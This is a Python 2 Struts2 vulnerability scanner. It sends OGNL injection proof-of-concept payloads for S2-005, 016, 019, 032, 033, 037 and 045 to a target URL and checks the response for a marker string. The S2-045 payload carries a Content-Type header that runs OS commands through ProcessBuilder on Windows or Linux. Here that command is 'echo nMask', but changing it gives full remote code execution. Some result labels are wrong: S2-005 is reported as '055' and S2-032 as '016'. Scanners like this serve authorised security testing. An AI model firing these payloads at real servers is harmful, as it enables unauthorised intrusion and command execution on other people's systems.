# coding=utf-8
# author:跳跳龙
# struts2漏洞检测 支持struts_005,033，016，019,032等漏洞

import requests
import threading
import urllib2
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
from django.shortcuts import render, render_to_response
from django.http import HttpResponse
import logging


def struts_019(target_url):
    try:
        poc = "?debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22pathtiaotiaolong_019:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()"
        poc_url = target_url + poc
        response = requests.get(url=poc_url,timeout=0.5)

        result = response.text.encode('utf-8')

        if 'tiaotiaolong_019' in result:
            if len(result) < 100:
                return (True, "struts2-019", target_url)
            else:
                return (False, "struts2-019", target_url)
        else:
            return (False, "struts2-019", target_url)
    except Exception, e:

        return ("Error", "struts2-019", target_url)


def struts_033(target_url):
    try:
        poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=tiaotiaolong_033"
        poc_url = target_url + poc

        response = requests.get(url=poc_url,timeout=0.5)
        result = response.text.encode('utf-8')
        # print result
        if 'tiaotiaolong_033' in result:
            # print "发现一处struts漏洞，漏洞类型：struts2-033。漏洞地址为" + target_url
            return (True, "struts2-033", target_url)
        # print result
        else:
            # print "此处尚未发现struts2-033类型漏洞"
            return (False, "struts2-033", target_url)
    except Exception, e:
        # print e
        return ("Error", "struts2-033", target_url)


def struts_005(target_url):
    try:
        poc = "?('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43xman.getWriter().println(\\43req.getRealPath(%22tiaotiaolong_005\\u005c%22))')(d))&(i99)(('\\43xman.getWriter().close()')(d))"
        poc_url = target_url + poc

        response = requests.get(url=poc_url,timeout=0.5)
        result = response.text.encode('utf-8')
        # print result
        if 'tiaotiaolong_005' in result:
            # print "发现一处struts漏洞，漏洞类型：struts2-055。漏洞地址为" + target_url
            return (True, "struts2-055", target_url)
        # print result
        else:
            # print "此处尚未发现struts2-005类型漏洞"
            return (False, "struts2-055", target_url)
    except Exception, e:
        # print e
        return ("Error", "struts2-055", target_url)


def struts_016(target_url):
    try:
        poc = "?redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22/tiaotiaolong_016%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D"
        poc_url = target_url + poc

        response = requests.get(url=poc_url,timeout=0.5)
        result = response.text.encode('utf-8')
        # print result
        if 'tiaotiaolong_016' in result:
            # print "发现一处struts漏洞，漏洞类型：struts2-016。漏洞地址为" + target_url
            return (True, "struts2-016", target_url)
        # print result
        else:
            # print "此处尚未发现struts2-016类型漏洞"
            return (False, "struts2-016", target_url)
    except Exception, e:
        return ("Error", "struts2-016", target_url)


def struts_032(target_url):
    try:
        poc = "?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=tiaotiaolong_032"
        poc_url = target_url + poc

        response = requests.get(url=poc_url,timeout=0.5)
        result = response.text.encode('utf-8')
        # print result
        if 'tiaotiaolong_032' in result:
            if len(result) < 100:
                # print "发现一处struts漏洞，漏洞类型：struts2-016。漏洞地址为" + target_url
                return (True, "struts2-016", target_url)
            # print result
            else:
                # print "此处尚未发现struts2-032类型漏洞"
                return (False, "struts2-016", target_url)
        else:
            # print "此处尚未发现struts2-032类型漏洞"
            return (False, "struts2-016", target_url)
    except Exception, e:
        # print e
        return ("Error", "struts2-032", target_url)


def struts_037(target_url):
    try:
        poc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=tiaotiaolong_037"
        poc_url = target_url + poc

        response = requests.get(url=poc_url,timeout=0.5)
        result = response.text.encode('utf-8')
        # print result
        if 'tiaotiaolong_037' in result:
            if len(result) < 100:
                # print "发现一处struts漏洞，漏洞类型：struts2-037。漏洞地址为" + target_url
                return (True, "struts2-037", target_url)
            # print result
            else:
                # print "此处尚未发现struts2-037类型漏洞"
                return (False, "struts2-037", target_url)
        else:
            # print "此处尚未发现struts2-037类型漏洞"
            return (False, "struts2-037", target_url)
    except Exception, e:
        # print e
        return ("Error", "struts2-037", target_url)


# 最新爆出来的漏洞 2017.03.07
def poc(target_url):
    register_openers()
    datagen, header = multipart_encode({"image1": open("./tmp.txt", "rb")})
    header[
        "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header[
        "Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo nMask').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    request = urllib2.Request(target_url, datagen, headers=header)
    response = urllib2.urlopen(request)
    body = response.read()
    return body


def struts_045(target_url):
    try:
        body = poc(target_url)
        if "nMask" in body:
            # return 1
            logging.basicConfig(filename='example.log', filemode='w', level=logging.DEBUG)
            logging.debug("True")
            return (True, "struts2-045", target_url)
            # HttpResponse("true")
        else:
            # return 2
            logging.basicConfig(filename='example.log', filemode='w', level=logging.DEBUG)
            logging.debug("False")
            return (False, "struts2-045", target_url)
    except Exception, e:
        # return (alse,"struts2-045",target_url)
        logging.basicConfig(filename='example.log', filemode='w', level=logging.DEBUG)
        logging.debug(e)
        return ("Error", "struts2-045", target_url)
